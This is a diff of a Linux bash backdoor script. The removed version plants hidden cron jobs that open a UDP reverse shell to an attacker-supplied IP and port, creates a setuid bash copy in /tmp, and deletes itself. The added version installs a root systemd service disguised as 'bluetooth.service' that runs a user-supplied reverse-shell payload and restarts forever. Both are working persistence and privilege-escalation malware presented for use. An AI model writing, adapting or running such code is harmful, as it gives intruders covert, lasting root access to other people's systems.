@@ -1,46 +1,35 @@
-#!/bin/bash
-# DEVELOPER DARKSEC
-# on the ip and port, choice the type from payload or connection reverse.
-# CREATE IN 2023 BY DARKSEC
+#!/usr/bin/env bash
+# My Backdoor with systemd very simple and persistent
 
-darksec="$PWD"
+Ow0=clear
 
-if [ -z $2 ];
-then
-          echo  'PUT YOUR IP LOCAL AND YOUR PORT FOR REVERSE SHELL'
+if [ $(/usr/bin/whoami) == "root" ]; then
+
+	$Ow0
+	echo "YOUR PAYLOAD FOR REVERSE SHELL"
+	read -p "[+] " payload
+
+	# CREATE A bluetooth.service FOR INIT IN SYSTEMD
+	$Ow0
+	echo "[backdoor]" > /etc/systemd/system/bluetooth.service
+	echo "Description=Backdoor_for_linux" >> /etc/systemd/system/bluetooth.service
+	echo "" >> /etc/systemd/system/bluetooth.service
+	echo "[Service]" >> /etc/systemd/system/bluetooth.service
+	echo "User=root" >> /etc/systemd/system/bluetooth.service
+	echo "Group=root" >> /etc/systemd/system/bluetooth.service
+	echo "WorkingDirectory=/root" >> /etc/systemd/system/bluetooth.service
+	echo "ExecStart= $payload" >> /etc/systemd/system/bluetooth.service
+	echo "Restart=always" >> /etc/systemd/system/bluetooth.service
+	echo "RestartSec=5" >> /etc/systemd/system/bluetooth.service
+	echo "" >> /etc/systemd/system/bluetooth.service
+	echo "[Install]" >> /etc/systemd/system/bluetooth.service
+	echo "WantedBy=multi-user.target" >> /etc/systemd/system/bluetooth.service
+
+	#INIT SERVICE BACKDOOR
+	systemctl start bluetooth.service && systemctl enable bluetooth.service
+
+	echo "[+] COMPLETED HAPPY HACKING, BACKDOOR SUCCESS!"
+
 else
-
-          echo '[+] RUNNING BACKDOOR'
-          sleep 1
-
-          # REVERSE SHELL WITH CRONTAB
-          sed -i -e '$i\* * * * * root .system.sh' /etc/crontab
-          sed -i -e '$i\* * * * * root .root.sh' /etc/crontab
-          sleep 5
-
-          # ENTER IN DIRETORY
-          cd /usr/local/bin
-          sleep 1
-
-          # CREATE FILES FOR SHELL REVERSE
-          touch .system.sh
-          echo "#\!/bin/bash" > /usr/local/bin/.system.sh
-          echo "sh -i >& /dev/udp/$1/$2 0>&1" >> /usr/local/bin/.system.sh
-          sleep 1
-          chmod +x /usr/local/bin/.system.sh
-          touch .root.sh
-          chmod +x /usr/local/bin/.root.sh
-          echo "#\!/bin/bash" > /usr/local/bin/.root.sh
-          echo "cp /bin/bash /tmp/.root && chmod +xs /tmp/.root" >> /usr/local/bin/.root.sh
-                    sleep 1
-
-          #BACK DIretory
-          cd $darksec
-
-          # DELETE BACKDOOR
-          rm -rf darksec.sh
-
-          # SUCCESS, BACKDOOR RUNNING
-          echo  '[+] SUCCESS BACKDOOR RUNNING!'
-
+	echo "You not root, run with root"
 fi
